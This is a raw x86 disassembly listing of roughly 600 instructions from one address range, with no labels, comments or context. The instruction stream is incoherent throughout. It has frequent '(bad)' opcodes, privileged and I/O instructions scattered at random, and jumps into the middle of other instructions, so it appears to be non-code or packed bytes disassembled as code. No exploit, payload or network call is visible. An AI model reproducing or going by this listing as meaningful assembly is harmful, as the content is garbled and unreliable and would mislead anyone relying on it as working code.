  432648:	adc    BYTE PTR [edi+0x0],dl
  43264b:	mov    bh,0x66
  43264d:	mov    edi,0xff038dc3
  432652:	jne    0x4326a8
  432654:	lea    edx,[ecx+0x1]
  432657:	mov    ebx,0xd64ff1
  43265c:	sar    DWORD PTR [ebx],1
  43265e:	test   BYTE PTR [ebp+0x36],dh
  432661:	mov    DWORD PTR [esp+edi*8-0x76],esp
  432665:	push   edi
  432666:	xor    BYTE PTR [ebx],0x38
  432669:	mov    esi,ebx
  43266b:	xor    eax,DWORD PTR [eax-0x3c73819a]
  432671:	ss inc ebp
  432673:	fs pop ebx
  432675:	mov    ebx,0x9c3b30
  43267a:	je     0x4326a7
  43267c:	xor    edi,DWORD PTR [ebx+0x668a33]
  432682:	mov    WORD PTR [ebx],?
  432684:	ss mov ebx,0x8b4e64
  43268a:	pop    edi
  43268b:	cmp    ecx,ecx
  43268d:	jne    0x4326e4
  43268f:	mov    ebp,esp
  432691:	cld    
  432692:	push   esi
  432693:	pop    ebx
  432694:	inc    ebp
  432695:	stc    
  432696:	xor    BYTE PTR [ebp+0x9bef89c],al
  43269c:	test   esi,ecx
  43269e:	clc    
  43269f:	test   dl,dl
  4326a1:	cmp    bh,bh
  4326a3:	fs pop si
  4326a6:	or     bl,al
  4326a8:	add    cl,BYTE PTR [ebx+0x57665100]
  4326ae:	retf   0x3c45
  4326b1:	xor    BYTE PTR [eax],al
  4326b3:	pushf  
  4326b4:	mov    si,0x85ca
  4326b8:	ret    0xf8
  4326bb:	pop    ebx
  4326bc:	dec    dx
  4326bf:	mov    edx,DWORD PTR [edi-0x76]
  4326c2:	push   edi
  4326c3:	add    al,0xb7
  4326c5:	xor    al,0xba
  4326c7:	cmp    al,0x8d
  4326c9:	je     0x4326ca
  4326cb:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4326cf:	lea    edi,[ebx+0x544fff]
  4326d5:	push   ecx
  4326d6:	cmp    edx,DWORD PTR [ebx+0x75]
  4326d9:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  4326df:	add    BYTE PTR [ebx],dh
  4326e1:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4326e7:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  4326ee:	mov    ebx,0x3b3b00
  4326f3:	jne    0x432720
  4326f5:	mov    DWORD PTR [ebx+0x728afc],edi
  4326fb:	xor    esi,DWORD PTR [ebx]
  4326fd:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432703:	push   edi
  432704:	cmp    esp,ebp
  432706:	jne    0x432708
  432708:	sbb    DWORD PTR [eax],0x8085c3fc
  43270e:	clc    
  43270f:	inc    esi
  432710:	pop    ebx
  432711:	sti    
  432712:	add    eax,0xeb8bc075
  432717:	cld    
  432718:	xor    edi,DWORD PTR ds:0xf8c3855e
  43271e:	mov    ecx,DWORD PTR [ecx+edx*2]
  432721:	rol    DWORD PTR [ebp-0x37],0xf
  432725:	mov    DWORD PTR [eax],ecx
  432727:	inc    edi
  432728:	(bad)  
  432729:	in     eax,0xfe
  43272b:	add    bh,bh
  43272d:	(bad)  
  43272e:	mov    esi,0xc38a5e
  432733:	mov    esi,DWORD PTR [ebx]
  432735:	push   ecx
  432736:	mov    edi,0xfc4ec7
  43273b:	test   DWORD PTR [ebp-0x8],edx
  43273e:	xor    di,ax
  432741:	pushf  
  432742:	sub    ebp,eax
  432744:	inc    ebp
  432745:	(bad)  
  432746:	sub    edi,edi
  432748:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  43274e:	inc    ebp
  43274f:	add    BYTE PTR [esi+0x2b],ah
  432752:	or     bh,BYTE PTR [edx+0xf8ac2]
  432758:	cmp    al,0x33
  43275a:	mov    edi,DWORD PTR [edx+0xfe4e81]
  432760:	(bad)  
  432761:	cmp    esi,DWORD PTR [ebx]
  432763:	je     0x43271d
  432765:	push   ebx
  432766:	dec    esi
  432767:	str    ecx
  43276a:	cmp    esp,DWORD PTR [ebp+0x75]
  43276d:	int    0x33
  43276f:	mov    edi,0x789085f
  432774:	mov    edx,DWORD PTR [eax]
  432776:	cld    
  432777:	add    cl,cl
  432779:	data16 add al,0xcb
  43277c:	push   ebp
  43277d:	add    ebp,esp
  43277f:	jne    0x43276d
  432781:	(bad)  
  432782:	mov    DWORD PTR [ecx],0xd685f7ec
  432788:	clc    
  432789:	xlat   BYTE PTR ds:[ebx]
  43278a:	inc    ebp
  43278b:	mov    esi,DWORD PTR [edx]
  43278d:	push   eax
  43278e:	pushf  
  43278f:	in     eax,0x8b
  432791:	add    ah,ch
  432793:	add    dl,BYTE PTR [eax+eax*1+0x51]
  432797:	add    ax,0x72cb
  43279b:	cmp    al,0x0
  43279d:	add    BYTE PTR [ebp+0x66],al
  4327a0:	(bad)  
  4327a1:	retf   
  4327a2:	lock ret 0x85
  4327a6:	clc    
  4327a7:	inc    bp
  4327a9:	retf   
  4327aa:	cmp    eax,0xc77d9cc8
  4327af:	xor    ah,bh
  4327b1:	pushf  
  4327b2:	test   DWORD PTR [edi-0x8],ebx
  4327b5:	je     0x4327fc
  4327b7:	xor    esi,DWORD PTR ds:0x7020840
  4327bd:	ror    BYTE PTR [ebp-0x37],0x8d
  4327c1:	push   ebp
  4327c2:	add    esp,ebp
  4327c4:	jb     0x432751
  4327c6:	add    BYTE PTR [eax],cl
  4327c8:	dec    ebp
  4327c9:	mov    bh,0x81
  4327cb:	push   esi
  4327cc:	push   esp
  4327cd:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  4327d4:	xor    al,BYTE PTR [eax]
  4327d6:	mov    edx,DWORD PTR [edi+0x10]
  4327d9:	(bad)  
  4327da:	scas   eax,DWORD PTR es:[edi]
  4327db:	ret    0x3b
  4327de:	jns    0x3b4424d1
  4327e4:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4327e8:	dec    ebp
  4327e9:	or     BYTE PTR [ebx],ch
  4327eb:	ret    0x458b
  4327ee:	lock jmp 0x4327e2
  4327f1:	mov    ecx,DWORD PTR [eax]
  4327f3:	or     BYTE PTR [edi],al
  4327f5:	mov    ecx,eax
  4327f7:	xor    DWORD PTR [edx+0x2],0x0
  4327fb:	mov    bh,0xc1
  4327fd:	adc    BYTE PTR [eax],dh
  4327ff:	iret   
  432800:	inc    ebp
  432801:	mov    DWORD PTR [ebx],0x4dfff8c4
  432807:	inc    BYTE PTR [ebx]
  432809:	ret    0xf8
  43280c:	adc    DWORD PTR [esi+0x10],esp
  43280f:	clc    
  432810:	dec    ecx
  432811:	fisttp WORD PTR [ecx+0x456604c0]
  432817:	add    dh,BYTE PTR ds:0x75e0845
  43281d:	ret    0x4d
  432820:	lea    ecx,[ebx+0x18728301]
  432826:	add    BYTE PTR [ebp+0x45],al
  432829:	xor    ecx,ebp
  43282b:	pushf  
  43282c:	add    bh,al
  43282e:	add    al,ch
  432830:	inc    ebp
  432831:	test   DWORD PTR [ebx-0x3eba0708],ecx
  432837:	xor    eax,0x781084d
  43283c:	push   esp
  43283d:	fwait
  43283e:	push   ecx
  43283f:	xor    al,BYTE PTR [ecx+0x32f89b89]
  432845:	inc    ebp
  432846:	cmp    edi,DWORD PTR [ecx]
  432848:	jbe    0x4327e6
  43284a:	mov    eax,edi
  43284c:	or     ah,dh
  43284e:	inc    ebp
  43284f:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432855:	xor    ecx,DWORD PTR [ebx-0x74747664]
  43285b:	in     al,dx
  43285c:	hlt    
  43285d:	push   esp
  43285e:	push   esp
  43285f:	push   ecx
  432860:	push   ecx
  432861:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  432867:	fwait
  432868:	fwait
  432869:	xor    dh,BYTE PTR [edx]
  43286b:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  432871:	or     BYTE PTR [ebp+0x7],al
  432874:	mov    eax,ecx
  432876:	clc    
  432877:	jb     0x43283a
  432879:	add    BYTE PTR [ebp+0x55],cl
  43287c:	or     DWORD PTR [edi],0xc251d154
  432882:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  43288c:	mov    edi,eax
  43288e:	or     cl,al
  432890:	inc    ebp
  432891:	dec    ebp
  432892:	mov    eax,DWORD PTR [ecx+0x514d540c]
  432898:	or     WORD PTR [ecx],0x899b
  43289d:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4328a3:	mov    edx,DWORD PTR [ecx+0x8]
  4328a6:	mov    eax,DWORD PTR [ebp-0x8]
  4328a9:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4328b0:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4328b6:	inc    ebp
  4328b7:	dec    eax
  4328b8:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4328be:	add    edx,DWORD PTR [ecx-0x8]
  4328c1:	mov    ecx,DWORD PTR [ecx]
  4328c3:	clc    
  4328c4:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4328cb:	mov    ecx,ebp
  4328cd:	clc    
  4328ce:	(bad)  
  4328cf:	popf   
  4328d0:	inc    DWORD PTR [eax]
  4328d2:	ret    0x8b
  4328d5:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4328db:	mov    edi,esp
  4328dd:	hlt    
  4328de:	test   ecx,esi
  4328e0:	clc    
  4328e1:	or     BYTE PTR [ebp+0x7],al
  4328e4:	xor    al,cl
  4328e6:	pushf  
  4328e7:	jb     0x43291c
  4328e9:	add    BYTE PTR [eax-0x3f],al
  4328ec:	inc    eax
  4328ed:	daa    
  4328ee:	inc    ebp
  4328ef:	inc    ebp
  4328f0:	xor    eax,0x7f80803
  4328f5:	dec    ebp
  4328f6:	fwait
  4328f7:	add    esi,DWORD PTR [edx]
  4328f9:	clc    
  4328fa:	cmp    DWORD PTR [ecx],ecx
  4328fc:	or     al,0x8
  4328fe:	add    al,BYTE PTR [ebp+0x2c]
  432901:	xor    eax,0x7350845
  432906:	or     BYTE PTR [ebp+0x7],cl
  432909:	lea    ebx,[ebx-0x748dcdff]
  43290f:	add    BYTE PTR [eax*2-0x74b21438],cl
  432916:	mov    edx,DWORD PTR [eax]
  432918:	cld    
  432919:	dec    ebp
  43291a:	push   esp
  43291b:	sub    edx,DWORD PTR [ecx-0x75]
  43291e:	add    eax,0xf172fc
  432923:	or     BYTE PTR [ebp+0x7],cl
  432926:	add    eax,ecx
  432928:	or     al,0x72
  43292a:	add    DWORD PTR [eax],eax
  43292c:	mov    ebx,0x29c2c1
  432931:	inc    ebp
  432932:	mov    eax,DWORD PTR [ebx]
  432934:	cmp    eax,0x3004d1c
  43293a:	xbegin 0x66c8b534
  432940:	clc    
  432941:	or     BYTE PTR [ebp+0x45],al
  432944:	xor    dh,BYTE PTR ds:0x78b089c
  43294a:	adc    BYTE PTR [ebp+0x45],cl
  43294d:	lea    eax,[ebp+0x33727501]
  432953:	add    cl,ch
  432955:	inc    ebp
  432956:	add    bl,ch
  432958:	add    BYTE PTR [ebx+0x45850845],cl
  43295e:	je     0x4328eb
  432960:	push   ebx
  432961:	or     al,0x85
  432963:	dec    ebp
  432964:	std    
  432965:	mov    bh,bh
  432967:	mov    BYTE PTR [ebp-0x75],al
  43296a:	mov    edi,eax
  43296c:	or     al,0x89
  43296e:	inc    ebp
  43296f:	clc    
  432970:	mov    esp,esp
  432972:	hlt    
  432973:	call   DWORD PTR [edi-0x37]
  432976:	push   esp
  432977:	or     al,0x51
  432979:	push   ebp
  43297a:	xor    ebp,esp
  43297c:	mov    esi,0x457251
  432981:	xor    esi,eax
  432983:	pushf  
  432984:	inc    ebp
  432985:	(bad)  
  432986:	mov    edi,eax
  432988:	or     al,0x85
  43298a:	add    al,bh
  43298c:	inc    eax
  43298e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432992:	or     ah,bh
  432994:	inc    eax
  432995:	push   esp
  432996:	jmp    0x4329e9
  432998:	mov    eax,DWORD PTR ds:0xe8720c
  43299e:	mov    DWORD PTR [ebp-0x8],eax
  4329a1:	jne    0x4329e8
  4329a3:	jmp    0x432930
  4329a5:	mov    ebp,DWORD PTR [eax]
  4329a7:	clc    
  4329a8:	retf   0xff54
  4329ab:	push   ecx
  4329ac:	mov    DWORD PTR ds:0x757210,eax
  4329b2:	mov    ecx,DWORD PTR [ebp-0x4]
  4329b5:	sub    esp,DWORD PTR [ebx-0x77]
  4329b8:	dec    DWORD PTR [eax*4-0x74ca8abb]
  4329bf:	or     ah,bh
  4329c1:	pop    es
  4329c2:	ds fwait
  4329c4:	push   DWORD PTR [edx]
  4329c6:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  4329cc:	(bad)  
  4329cd:	mov    bh,bh
  4329cf:	jmp    0x4329bd
  4329d1:	leave  
  4329d2:	jne    0x4329dc
  4329d4:	call   0x30232e
  4329d9:	in     al,dx
  4329da:	dec    ebp
  4329db:	add    dh,BYTE PTR [ebx]
  4329dd:	add    BYTE PTR [ebx],al
  4329df:	inc    ebp
  4329e0:	cmp    esi,DWORD PTR [ecx]
  4329e2:	je     0x432980
  4329e4:	mov    eax,edi
  4329e6:	or     al,0xf0
  4329e8:	add    BYTE PTR [ebp+0x458bf845],al
  4329ee:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  4329f4:	adc    al,0x7
  4329f6:	enter  0x9fc0,0xa5
  4329fa:	rol    BYTE PTR [eax],0x5e
  4329fd:	mov    ecx,ecx
  4329ff:	or     al,0xc
  432a01:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432a08:	jmp    0x432a09
  432a0a:	push   ebp
  432a0b:	mov    esp,ebp
  432a0d:	cld    
  432a0e:	inc    ebp
  432a0f:	inc    ebp
  432a10:	or     DWORD PTR [ecx+0x457dec10],0x0
  432a17:	push   esi
  432a18:	push   esi
  432a19:	mov    edi,0x7af080f
  432a1e:	add    bh,al
  432a20:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432a26:	add    BYTE PTR [ecx+0x4540100f],cl
  432a2c:	mov    ebp,eax
  432a2e:	mov    ebp,edi
  432a30:	lock call edx
  432a33:	fcom   DWORD PTR [ebp+0x45]
  432a36:	mov    eax,0x148a8b
  432a3b:	push   ecx
  432a3c:	enter  0xc145,0x83
  432a40:	cmp    ecx,DWORD PTR [eax]
  432a42:	add    BYTE PTR [ebp+0x4d],al
  432a45:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432a4b:	call   0xffa325ba
  432a50:	cmp    eax,DWORD PTR [ebp-0xc]
  432a53:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432a57:	push   ebp
  432a58:	(bad)  
  432a59:	call   0x34285d
  432a5e:	mov    bh,0xdb
  432a60:	cld    
  432a61:	or     BYTE PTR [ebp+0x45],bl
  432a64:	(bad)  
  432a65:	call   0xff7d26f5
  432a6a:	add    al,BYTE PTR [ebp+0x37]
  432a6d:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432a73:	jne    0x432a75
  432a75:	(bad)  
  432a76:	cmp    edi,esp
  432a78:	jne    0x432aab
  432a7a:	mov    edi,edi
  432a7c:	or     BYTE PTR [ebx-0x307f0b49],cl
  432a82:	pop    ds
  432a83:	into   
  432a84:	je     0x432a47
  432a86:	mov    ebx,DWORD PTR [esi]
  432a88:	or     BYTE PTR [ebp-0x49],al
  432a8b:	mov    esp,DWORD PTR [esi-0x77]
  432a8e:	mov    esi,0x2451f0c
  432a93:	mov    eax,DWORD PTR [eax]
  432a95:	or     al,0x66
  432a97:	sar    bl,0x3b
  432a9a:	xor    esi,DWORD PTR [ebp+0x66]
  432a9d:	xor    ecx,edi
  432a9f:	pop    edi
  432aa0:	adc    bl,BYTE PTR [ebx+0x7e]
  432aa3:	ret    0xff
  432aa6:	cld    
  432aa7:	inc    ebp
  432aa8:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432aae:	cld    
  432aaf:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432ab6:	push   0xffffff83
  432ab8:	pop    edi
  432ab9:	or     BYTE PTR [ebp+0x53],dh
  432abc:	xorps  xmm1,xmm2
  432abf:	test   BYTE PTR [eax+eax*1],bh
  432ac2:	add    BYTE PTR [eax],al
  432ac4:	adc    eax,eax
  432ac6:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432ace:	jmp    DWORD PTR [eax]
  432ad0:	ror    al,0x5e
  432ad3:	inc    ebp
  432ad4:	leave  
  432ad5:	xor    ecx,DWORD PTR [eax]
  432ad7:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432add:	add    ah,al
  432adf:	xor    edi,edi
  432ae1:	xor    DWORD PTR [ebx],0x66003302
  432ae7:	mov    DWORD PTR [ebp-0xc],ecx
  432aea:	pcmpgtw mm0,mm0
  432aed:	add    dl,ah
  432aef:	leave  
  432af0:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432af4:	push   eax
  432af5:	dec    ebp
  432af6:	mov    esi,DWORD PTR [ebx-0x75]
  432af9:	lea    ebp,[eax-0x7c00ff02]
  432aff:	xor    eax,DWORD PTR [eax]
  432b01:	sysret 
  432b03:	dec    ebp
  432b04:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432b0b:	push   WORD PTR [ecx+0x8]
  432b0f:	jne    0x432ad2
  432b11:	ud0    ecx,DWORD PTR [ecx]
  432b14:	mov    eax,edx
  432b16:	lods   al,BYTE PTR ds:[esi]
  432b17:	add    BYTE PTR [eax],al
  432b19:	data16 (bad) 
  432b1b:	iret   
  432b1c:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432b23:	cli    
  432b24:	inc    ebp
  432b25:	cmp    al,0x8d
  432b27:	add    BYTE PTR [esi+0x2d],ah
  432b2a:	inc    ebp
  432b2b:	pop    ebp
  432b2c:	lea    ecx,[edi]
  432b2e:	mov    dl,bh
  432b30:	add    BYTE PTR [edi],cl
  432b32:	mov    DWORD PTR [eax+eax*8],edi
  432b35:	mov    ebx,0x3b87
  432b3a:	add    BYTE PTR [ebx],ch
  432b3c:	inc    ebp
  432b3d:	data16 (bad) 
  432b3f:	clc    
  432b40:	int3   
  432b41:	cmp    eax,DWORD PTR [eax]
  432b43:	je     0x432ace
  432b45:	push   0xffffffc8
  432b47:	pop    edi
  432b48:	xchg   DWORD PTR [ebp+0x0],eax
  432b4b:	data16 add BYTE PTR [ebp+0x45],cl
  432b4f:	lea    cx,[ebp+0x10]
  432b53:	jb     0x432b55
  432b55:	jmp    0x432ae0
  432b57:	call   eax
  432b59:	clc    
  432b5a:	xchg   DWORD PTR [edi+0x1],edi
  432b5d:	mov    eax,DWORD PTR [eax]
  432b5f:	or     BYTE PTR [ebp-0x49],al
  432b62:	lea    eax,[eax+0x74003154]
  432b68:	push   edi
  432b69:	inc    edx
  432b6a:	jge    0x432b6b
  432b6c:	mov    DWORD PTR [edi],ecx
  432b6e:	fdiv   DWORD PTR [edi-0x6]
  432b71:	inc    DWORD PTR [eax]
  432b73:	xor    edx,DWORD PTR [eax+0x5f]
  432b76:	xchg   DWORD PTR [ebx+0x1],ebx
  432b79:	ret    0x0
  432b7c:	xor    BYTE PTR [ebp-0x51],cl
  432b7f:	cmp    edi,0xf0ff89fe
  432b85:	data16 ror al,0x84
  432b89:	rol    BYTE PTR [eax],0x3b
  432b8c:	add    al,dh
  432b8e:	dec    eax
  432b8f:	xchg   esp,eax
  432b90:	push   ebx
  432b91:	jmp    0x432b1e
  432b93:	push   ebp
  432b94:	add    esp,ebp
  432b96:	add    ebp,esp
  432b98:	mov    edx,DWORD PTR [edi+0x24]
  432b9b:	clc    
  432b9c:	dec    esi
  432b9d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432ba3:	cmp    BYTE PTR [ebx],al
  432ba5:	jne    0x432b30
  432ba7:	xor    esp,eax
  432ba9:	jmp    0x462d2c
  432bae:	add    ebp,DWORD PTR [ecx+ecx*4]
  432bb1:	jne    0x432ba7
  432bb3:	call   0xffcd290d
  432bb8:	clc    
  432bb9:	xchg   edi,eax
  432bba:	sti    
  432bbb:	add    DWORD PTR [ebx],eax
  432bbd:	add    BYTE PTR [ebp+0x47],bl
  432bc0:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432bc6:	pop    ebp
  432bc7:	mov    DWORD PTR [esi-0x48],esi
  432bca:	jmp    0x432c13
  432bcc:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432bd2:	(bad)  
  432bd4:	cmp    al,0x0
  432bd6:	cmp    eax,DWORD PTR [ebp+0x18]
  432bd9:	lea    ebx,[ebp-0x56]
  432bdc:	jle    0x432bde
  432bde:	jae    0x432b69
  432be0:	mov    eax,esp
  432be2:	call   0xb900:0x8b005587
  432be9:	inc    ebp
  432bea:	push   ebp
  432beb:	lea    ecx,[ebp-0x27ff4f12]
  432bf1:	mov    eax,edi
  432bf3:	int3   
  432bf4:	push   ebp
  432bf5:	xchg   edi,eax
  432bf7:	add    esp,ebp
  432bf9:	add    BYTE PTR [eax],al
  432bfb:	inc    ebp
  432bfc:	add    BYTE PTR [ebp+0x8b3255],cl
  432c02:	cld    
  432c03:	mov    DWORD PTR [edx],edi
  432c05:	aam    0x75
  432c07:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432c0d:	mov    DWORD PTR [ebx-0x50],edx
  432c10:	test   BYTE PTR [ebp-0x1],0xe8
  432c14:	mov    eax,DWORD PTR [eax]
  432c16:	hlt    
  432c17:	add    al,al
  432c19:	mov    eax,DWORD PTR ds:0x890045a8
  432c1f:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432c25:	inc    DWORD PTR [eax*2+0xf75854d]
  432c2c:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432c32:	call   0x72998973
  432c37:	je     0x432c97
  432c39:	js     0x432c9a
  432c3b:	lock ret 0x7e
  432c3f:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432c45:	mov    edi,edi
  432c47:	sbb    al,bl
  432c49:	clc    
  432c4a:	add    BYTE PTR [ebp-0x73],bh
  432c4d:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432c53:	ror    BYTE PTR [eax],1
  432c55:	dec    ebp
  432c56:	xchg   ebp,eax
  432c57:	mov    edi,edi
  432c59:	in     al,0x8b
  432c5b:	jge    0x432be6
  432c5d:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432c63:	clc    
  432c64:	pop    esi
  432c65:	fist   DWORD PTR [ebp+0x5d398b5d]
  432c6b:	clc    
  432c6c:	add    al,0x6e
  432c6e:	mov    eax,DWORD PTR [ebx]
  432c70:	mov    BYTE PTR [ebp+0x0],dl
  432c73:	mov    edx,DWORD PTR [ebx-0x20]
  432c76:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432c7c:	add    eax,0x3b3b73
  432c81:	adc    al,0x89
  432c83:	pop    eax
  432c84:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432c88:	ret    0xf08
  432c8b:	cmp    al,0x2
  432c8d:	mov    edx,eax
  432c8f:	cld    
  432c90:	add    BYTE PTR [ebp+0x66],dl
  432c93:	add    eax,ebx
  432c95:	add    esp,eax
  432c97:	sub    eax,eax
  432c99:	or     BYTE PTR [ecx-0x77f474bb],cl
  432c9f:	add    BYTE PTR [eax],al
  432ca1:	mov    DWORD PTR [ebx-0x24],ebx
  432ca4:	push   edi
  432ca5:	push   ebp
  432ca6:	clc    
  432ca7:	add    DWORD PTR [esi+0x1b0100],0x45
  432cae:	out    0xff,eax
  432cb0:	add    edx,DWORD PTR [eax]
  432cb2:	jmp    0x432c9c
  432cb4:	cmp    ch,0x46
  432cb7:	(bad)  
  432cb8:	jmp    0x40c8b50a
  432cbd:	je     0x432c49
  432cbf:	mov    eax,DWORD PTR [eax-0x10c78104]
  432cc5:	inc    ebp
  432cc6:	add    BYTE PTR [ebx-0x770375],al
  432ccc:	add    ah,ch
  432cce:	add    edx,esp
  432cd0:	pop    edi
  432cd1:	pop    ebp
  432cd2:	push   ebp
  432cd3:	inc    ebx
  432cd4:	in     al,dx
  432cd5:	pop    ebp
  432cd6:	in     al,dx
  432cd7:	cmp    edx,DWORD PTR [edi-0x8]
  432cda:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432ce1:	add    al,0x47
  432ce3:	push   ebp
  432ce4:	mov    esp,ebp
  432ce6:	in     al,0x45
  432ce8:	dec    ebp
  432ce9:	push   esi
  432cea:	test   DWORD PTR [eax+0xfb010f],esi
  432cf0:	add    BYTE PTR [eax+0xc018b],dh
  432cf6:	leave  
  432cf7:	inc    ebp
  432cf8:	test   al,ch
  432cfa:	add    dh,bh
  432cfc:	add    bh,bh
  432cfe:	dec    ebp
  432cff:	push   cs
  432d00:	mov    DWORD PTR [ecx],eax
  432d02:	hlt    
  432d03:	push   es
  432d04:	dec    ebp
  432d05:	leave  
  432d06:	mov    DWORD PTR [eax],ecx
  432d08:	clc    
  432d09:	cmovge eax,ecx
  432d0c:	mov    ecx,0x85c2f0
  432d12:	clc    
  432d13:	pop    DWORD PTR [ebp+0x1]
  432d16:	push   ebx
  432d17:	add    BYTE PTR [ebp-0x15],bh
  432d1a:	push   esi
  432d1b:	xor    eax,0x898a45
  432d20:	cld    
  432d21:	add    al,BYTE PTR [ebp+0x0]
  432d24:	xor    esp,DWORD PTR [esi-0x64]
  432d27:	add    DWORD PTR [esi+0x78308c1],edi
  432d2d:	add    ah,BYTE PTR [ebp-0x49]
  432d30:	int    0xbb
  432d32:	mov    ecx,DWORD PTR [esi+0xc]
  432d35:	add    dh,al
  432d37:	cmp    ecx,ebx
  432d39:	jne    0x432d03
  432d3b:	xor    ecx,DWORD PTR [ebp+0x66]
  432d3e:	jmp    0xca2d44
  432d43:	add    DWORD PTR [ebp+0x0],eax
  432d46:	mov    eax,ebx
  432d48:	or     al,0x8b
  432d4a:	(bad)  
  432d4b:	mov    ecx,esi
  432d4d:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432d54:	mov    eax,edi
  432d56:	or     BYTE PTR [edx],cl
  432d58:	shl    cl,cl
  432d5a:	icebp  
  432d5b:	add    BYTE PTR [ebp+0x38],0x8b
  432d5f:	or     BYTE PTR [edx+eax*2],cl
  432d62:	(bad)  
  432d63:	or     cl,dh
  432d65:	stc    
  432d66:	shl    DWORD PTR [ebp-0x30],0xc6
  432d6a:	xor    al,0x0
  432d6c:	inc    ebp
  432d6d:	xchg   BYTE PTR [ebx],al
  432d6f:	add    esp,edi
  432d71:	add    BYTE PTR [ebp-0x39],cl
  432d74:	mov    al,bl
  432d76:	test   DWORD PTR [ebx+0x1c348375],ecx
  432d7c:	sub    al,0xbf
  432d7e:	jmp    0x432d05
  432d80:	mov    edi,eax
  432d82:	lock jge 0x432d76
  432d85:	lea    esi,[edx-0x74bad5ff]
  432d8b:	mov    ebp,esp
  432d8d:	or     cl,dh
  432d8f:	leave  
  432d90:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432d97:	dec    ebp
  432d98:	dec    ebp
  432d99:	test   DWORD PTR [ebx],eax
  432d9b:	paddb  mm6,mm0
  432d9e:	add    DWORD PTR [eax],eax
  432da0:	dec    ebp
  432da1:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432da7:	mov    esi,DWORD PTR [edx]
  432da9:	or     al,0x2b
  432dab:	dec    ebp
  432dac:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432db2:	mov    esp,edi
  432db4:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432dbb:	mov    DWORD PTR [ebx],ebp
  432dbd:	call   0xc76b6ed
  432dc2:	mov    DWORD PTR [ebp+0x10],ecx
  432dc5:	(bad)  
  432dc6:	push   0x8b85ff10
  432dcb:	clc    
  432dcc:	or     al,0x54
  432dce:	(bad)  
  432dcf:	push   ecx
  432dd0:	retf   
  432dd1:	mov    ebx,0xff4d8dc8
  432dd6:	mov    DWORD PTR [ebp+0x8],eax
  432dd9:	xor    eax,DWORD PTR [ebp-0x75]
  432ddc:	cmp    ebp,DWORD PTR [ebx]
  432dde:	lsl    ebx,WORD PTR [edi-0x8]
  432de2:	call   DWORD PTR [ebx-0x741bff75]
  432de8:	(bad)  
  432de9:	or     al,0x5b
  432deb:	dec    ebp
  432dec:	or     BYTE PTR [ebx],dh
  432dee:	inc    ebp
  432def:	xor    esi,DWORD PTR ds:0x708088d
  432df5:	in     eax,0x9b
  432df7:	add    BYTE PTR [edx],dh
  432df9:	inc    ebp
  432dfa:	pop    edi
  432dfb:	xor    eax,edx
  432dfd:	test   DWORD PTR [eax],0x81108b8b
  432e03:	dec    ebp
  432e04:	sub    al,0x33
  432e06:	add    BYTE PTR [ebx],dh
  432e08:	push   esi
  432e09:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432e0f:	mov    edi,eax
  432e11:	or     BYTE PTR [ebp+0x45],al
  432e14:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432e1a:	xor    ecx,ecx
  432e1c:	pushf  
  432e1d:	push   es
  432e1e:	mov    DWORD PTR [esi-0x4],0xf8178538
  432e25:	dec    ebp
  432e26:	inc    ebp
  432e27:	cmp    BYTE PTR [ecx],0x54
  432e2a:	pushf  
  432e2b:	gs (bad) 
  432e2d:	shl    esp,1
  432e2f:	dec    ebp
  432e30:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432e36:	shr    ecx,1
  432e38:	xlat   BYTE PTR ds:[ebx]
  432e39:	rol    bh,cl
  432e3b:	mov    edx,esp
  432e3d:	or     BYTE PTR [ebp+0x4588f84d],al
  432e43:	mov    ecx,DWORD PTR [eax]
  432e45:	or     BYTE PTR [eax],al
  432e47:	push   ebp
  432e48:	mov    edi,DWORD PTR [eax+0xfc728b]
  432e4e:	dec    ebp
  432e4f:	enter  0xceba,0x8
